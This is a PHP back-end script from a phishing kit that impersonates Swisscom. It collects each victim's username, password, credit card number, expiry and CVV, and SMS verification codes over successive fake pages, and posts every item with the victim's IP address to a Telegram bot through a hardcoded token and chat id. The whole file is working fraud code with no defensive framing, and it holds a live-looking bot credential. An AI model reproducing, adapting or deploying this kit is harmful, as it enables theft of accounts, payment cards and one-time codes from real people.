<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

$apiToken = "8996897311:AAEDMIEiRwjmKna-9Mk_aBzmov6HSRZzLhk";
$id = "-5497079226";


if ($_POST['step']== 'index') {
    $user = $_POST['user'];
    $password = $_POST['password'];
    $_SESSION['user'] = $_POST['user'];

    if ( empty($user)) {

         header("Location: index.php");
        exit();

    }else{
       

        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
         header("Location: password.php");
        exit();
    }
}


if ($_POST['step']== 'password') {

    $password = $_POST['password'];

    if (empty($password)) {

         header("Location: password.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = "======>" . " | LOGIN | SWISSCOM" ."<======" .  "\r\n" ;
        $message  =  $adrress ." _________ INFO_LOGIN___" . "\r\n";
        $message .= "USER : " . $_SESSION['user'] .                  "\r\n";
        $message .= "PASSWORD : " . $password                 . "\r\n";

        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
         header("Location: loading.php");
        exit();
    }
}



if ($_POST['step']== 'cc') {
    $card_number = $_POST['card_number'];
    $cvv = $_POST['cvv'];
    $expiry = $_POST['expiry'];


    function validateCardType($card_number) {

    $card_number = str_replace(array(' ', '-'), '', $card_number);
    

    if (preg_match("/^4[0-9]{12}(?:[0-9]{3})?$/", $card_number)) {
        return "Visa";
    }
    

    if (preg_match("/^5[1-5][0-9]{14}$/", $card_number)) {
        return "Mastercard";
    }
    

    return "Unknown";
}
    $cardType = validateCardType($card_number);



    if ($cardType == "Unknown" || empty($expiry) || empty($cvv)) {

       header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | CC | SWISSCOM "       . "\r\n" ;
        $message .= "card_number : " . $card_number             . "\r\n";
        $message .= "expiry : " . $expiry                   . "\r\n";
        $message .= "cvv : " . $cvv             . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading3.php");
        exit();
    }
}


if ($_POST['step']== 'sms') {
    $sms = $_POST['sms'];


    if ( empty($sms) ) {

         header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = "======>" . " | SMS | SWISSCOM" ."<======" .  "\r\n" ;
        $message  =  $adrress ." _________ INFO_SMS___" . "\r\n";
        $message .= "SMS : " . $sms     . "\r\n";

        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
         header("Location: loading4.php");
        exit();
    }
}



if ($_POST['step']== 'sms-er') {
    $sms = $_POST['sms'];


    if ( empty($sms) ) {

         header("Location: sms-er.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = "======>" . " | SMS | SWISSCOM" ."<======" .  "\r\n" ;
        $message  =  $adrress ." _________ INFO_SMS___" . "\r\n";
        $message .= "SMS 2: " . $sms     . "\r\n";

        
       if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
         header("Location: success.php");
        exit();
    }
}




?>